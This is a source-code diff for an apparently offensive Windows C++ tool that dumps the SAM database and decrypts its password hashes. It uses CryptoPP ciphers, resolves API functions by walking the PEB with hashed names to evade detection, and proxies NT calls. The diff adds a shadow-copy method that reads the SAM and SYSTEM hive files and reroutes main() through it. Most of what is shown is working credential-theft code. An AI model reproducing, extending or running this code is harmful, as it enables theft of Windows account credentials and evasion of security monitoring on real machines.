@@ -8,34 +8,35 @@
 
 #include <Windows.h>
 #include <winternl.h>
-#include <BaseTsd.h>
-#include <ntstatus.h>
-#include <comdef.h>
-#include <string.h>
+//#include <BaseTsd.h>
+//#include <ntstatus.h>
+//#include <comdef.h>
+//#include <string.h>
 
-#include "main.h"
-#include "proxyNtCalls.h"
+#include "include/main.h"
+#include "include/proxyNtCalls.h"
+#include "include/shadowMethod.h"
 
-#include "cryptopp/include/aes.h"
+#include "include/cryptopp/aes.h"
 using CryptoPP::AES;
 
-#include "cryptopp/include/ccm.h"
+#include "include/cryptopp/ccm.h"
 using CryptoPP::CBC_Mode;
 using CryptoPP::ECB_Mode;
 
-#include "cryptopp/include/filters.h"
+#include "include/cryptopp/filters.h"
 using CryptoPP::ArraySource;
 using CryptoPP::StreamTransformationFilter;
 using CryptoPP::ArraySink;
 using CryptoPP::Redirector;
 
-#include "cryptopp/include/md5.h"
+#include "include/cryptopp/md5.h"
 using CryptoPP::MD5;
 
-#include "cryptopp/include/arc4.h"
+#include "include/cryptopp/arc4.h"
 using CryptoPP::ARC4;
 
-#include "cryptopp/include/des.h"
+#include "include/cryptopp/des.h"
 using CryptoPP::DES;
 
 // Globals "myFuncs"
@@ -47,7 +48,6 @@ myNtQueryValueKey pMyNtQueryValueKey;
 myNtEnumerateValueKey pMyNtEnumerateValueKey;
 myNtClose pMyNtClose;
 myRtlInitUnicodeString pMyRtlInitUnicodeString;
-
 
 // Get Address from Export in module by walking PEB. Thus, not calling GetModuleHandle + GetProcAddress.
 FARPROC myGetProcAddress(DWORD moduleHash, DWORD exportHash) {
@@ -188,7 +188,7 @@ void getSAM(PSAM samRegEntries[], PULONG size) {
 			}
 
 			PSAM sam = (PSAM)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(SAM));
-			wcscpy_s(sam->rid, keyInfoSubKeysBasic->NameLength, keyInfoSubKeysBasic->Name);
+			wcscpy_s(sam->rid, MAX_KEY_LENGTH, keyInfoSubKeysBasic->Name);
 
 			getClasses(sam);
 
@@ -648,15 +648,25 @@ int main(int argc, char** argv) {
 	#endif // !PROXY_NT_CALLS
 
 	// Time to debug as always works at first :D
+	// 
 	ULONG size;
-	getSAM(NULL, &size);
+	//getSAM(NULL, &size);
 
 	// Array of PSAM
 	PSAM sam[MAX_SAM_ENTRIES] = {};
 
-	getSAM(sam, &size);
+	//getSAM(sam, &size);
 
-	decryptSAM(sam, size/sizeof(SAM));
+	//decryptSAM(sam, size/sizeof(SAM));
 
-	HeapFree(GetProcessHeap(), 0, sam);
+	//HeapFree(GetProcessHeap(), 0, sam);
+
+	WCHAR sourcePathFileSAM[MAX_PATH * sizeof(WCHAR)];
+	WCHAR sourcePathFileSYSTEM[MAX_PATH * sizeof(WCHAR)];
+	createSS(sourcePathFileSAM, sourcePathFileSYSTEM);
+
+	getSAMfromRegf(NULL, &size, sourcePathFileSAM, sourcePathFileSYSTEM);
+	getSAMfromRegf(sam, &size, sourcePathFileSAM, sourcePathFileSYSTEM);
+
+	decryptSAM(sam, size / sizeof(SAM));
 }
